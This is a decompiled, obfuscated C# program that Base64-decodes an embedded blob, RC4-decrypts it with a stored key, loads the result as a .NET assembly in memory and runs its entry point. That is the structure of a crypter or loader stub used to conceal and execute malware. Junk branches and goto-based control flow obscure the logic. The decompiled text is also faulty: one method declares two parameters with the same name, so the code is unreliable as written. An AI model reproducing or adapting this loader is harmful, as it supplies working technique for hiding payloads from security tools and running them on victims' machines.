using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using SmartAssembly.MemoryManagement;

namespace ns0;

internal sealed class Class0
{
	[STAThread]
	public static void Main()
	{
		string text = default(string);
		byte[] array = default(byte[]);
		Assembly assembly = default(Assembly);
		MethodInfo entryPoint = default(MethodInfo);
		object objectValue = default(object);
		object[] array2 = default(object[]);
		bool flag = default(bool);
		object[] array3 = default(object[]);
		string[] array5 = default(string[]);
		try
		{
			MemoryManager.smethod_0();
			if (!Class32.smethod_3())
			{
				return;
			}
			if (true)
			{
				MemoryManager.smethod_0();
				text = Class5.smethod_0(52);
				array = smethod_0(Convert.FromBase64String(text), Class5.smethod_0(79248));
				assembly = AppDomain.CurrentDomain.Load(array);
				entryPoint = assembly.EntryPoint;
				objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
				array2 = null;
				if (flag = entryPoint.GetParameters().Length > 0)
				{
					array3 = new object[1];
					object[] array4 = array3;
					array5 = new string[1] { null };
					array4[0] = array5;
					goto IL_008f;
				}
			}
			goto IL_0092;
			IL_008f:
			array2 = array3;
			goto IL_0092;
			IL_0092:
			entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), array2);
			if (0 == 0)
			{
				return;
			}
			goto IL_008f;
		}
		catch (Exception cO_)
		{
			Class31.smethod_2(cO_, new object[9] { array, text, array2, objectValue, entryPoint, assembly, array5, array3, flag });
		}
	}

	public static byte[] smethod_0(byte[] CO_, string CO_)
	{
		checked
		{
			byte[] array = default(byte[]);
			uint[] array2 = default(uint[]);
			byte[] array3 = default(byte[]);
			uint num2 = default(uint);
			uint num4 = default(uint);
			uint num5 = default(uint);
			uint num6 = default(uint);
			int num8 = default(int);
			int num9 = default(int);
			int num10 = default(int);
			byte[] array4 = default(byte[]);
			try
			{
				byte[] bytes = Encoding.ASCII.GetBytes(CO_);
				if (4u != 0)
				{
					array = bytes;
				}
				array2 = new uint[256];
				int num = CO_.Length - 1 + 1;
				while (true)
				{
					array3 = new byte[num];
					num2 = 0u;
					while (true)
					{
						array2[(int)num2] = num2;
						num2++;
						while (true)
						{
							uint num3 = num2;
							num4 = 255u;
							if (num3 <= num4)
							{
								break;
							}
							num2 = 0u;
							while (true)
							{
								num5 = (uint)(unchecked((long)checked(num5 + array[(int)unchecked((long)num2 % (long)array.Length)] + array2[(int)num2])) & 0xFFL);
								num6 = array2[(int)num2];
								array2[(int)num2] = array2[(int)num5];
								if (0 == 0)
								{
									array2[(int)num5] = num6;
								}
								num2++;
								uint num7 = num2;
								num4 = 255u;
								while (num7 > num4)
								{
									if (false)
									{
										goto end_IL_00e3;
									}
									num2 = 0u;
									num5 = 0u;
									num8 = array3.Length - 1;
									num9 = 0;
									while (true)
									{
										num = num9;
										if (false)
										{
											break;
										}
										num10 = num8;
										if (num <= num10)
										{
											num7 = num2;
											if (0 == 0)
											{
												num2 = (uint)((unchecked((long)num7) + 1L) & 0xFF);
												if (0 == 0)
												{
													num5 = (uint)(unchecked((long)checked(num5 + array2[(int)num2])) & 0xFFL);
													num6 = array2[(int)num2];
													array2[(int)num2] = array2[(int)num5];
												}
												array2[(int)num5] = num6;
												array3[num9] = (byte)(CO_[num9] ^ array2[(int)(unchecked((long)checked(array2[(int)num2] + array2[(int)num5])) & 0xFFL)]);
												num9++;
												continue;
											}
											goto IL_00ce;
										}
										array4 = array3;
										return array4;
									}
									goto end_IL_0126;
									IL_00ce:;
								}
								continue;
								end_IL_00e3:
								break;
							}
						}
						continue;
						end_IL_0126:
						break;
					}
				}
			}
			catch (Exception cO_)
			{
				Class29.smethod_10(cO_, new object[13]
				{
					array, array2, num2, array4, array3, num6, num5, num9, num8, num4,
					num10, CO_, CO_
				});
				throw;
			}
		}
	}
}
